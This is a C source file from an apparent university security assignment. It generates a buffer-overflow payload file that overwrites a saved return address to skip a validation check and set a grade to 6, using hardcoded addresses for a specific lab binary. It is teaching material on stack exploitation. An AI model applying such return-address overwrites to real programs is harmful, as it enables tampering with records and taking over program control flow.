/*------------------------------------------------------*/
/*              Name: Athanasios Ioannis                */
/*              Surname: Xanthopoylos                   */
/*              AM: 4702                                */
/*              Date: 12-05-2023                        */
/*              Assignment: 6                           */
/*                                                      */
/*           Buffer overflow attack and H4CK1NG         */
/*------------------------------------------------------*/
#include <stdlib.h>
#include <stdio.h>


int main(){
	int i;
	FILE *data6;
	/*Create the data6 file and write in it*/
	data6 = fopen("data6","w");
	/*21 BYTES*/
	fputc('T',data6);	/*Write my name in the buffer*/
	fputc('h',data6);
        fputc('a',data6);
        fputc('n',data6);
        fputc('a',data6);
        fputc('s',data6);
        fputc('i',data6);
        fputc('s',data6);
        fputc(' ',data6);
        fputc('X',data6);
        fputc('a',data6);
        fputc('n',data6);
        fputc('t',data6);
        fputc('h',data6);
        fputc('o',data6);
        fputc('p',data6);
        fputc('o',data6);
        fputc('u',data6);
        fputc('l',data6);
        fputc('o',data6);
        fputc('s',data6);

	/*Fill the rest of the buffer but when you reach the LS bit of
         var i(pos=35B) make it again 35 so it doesnt reset back to i=0
        fill everything after that with 0*/
	for(i = 0; i < 24; i++){	/*46 Bytes*/
		if(i == 13){	/*30+5 Bytes = LS of var i*/
			fputc(0x23,data6);
		}
		fputc(0,data6);
	}

	fputc(0x98,data6);	/*Add the ebp but it is not needed*/
	fputc(0xf4,data6);
	fputc(0xff,data6);
	fputc(0xbf,data6);

	fputc(0x8e,data6);	/*Change the R.A. to be the next*/
	fputc(0x9e,data6);	/*command after the if statement*/
	fputc(0x04,data6);	/*so we completely skip the validation*/
	fputc(0x08,data6);	/*and we change the grade to 6*/

	fputc(0xdc,data6);	/*Add the address of &Name back */
        fputc(0x42,data6);
        fputc(0x0e,data6);
        fputc(0x08,data6);

	/*Close the file*/
	fclose(data6);
	return 0;
}
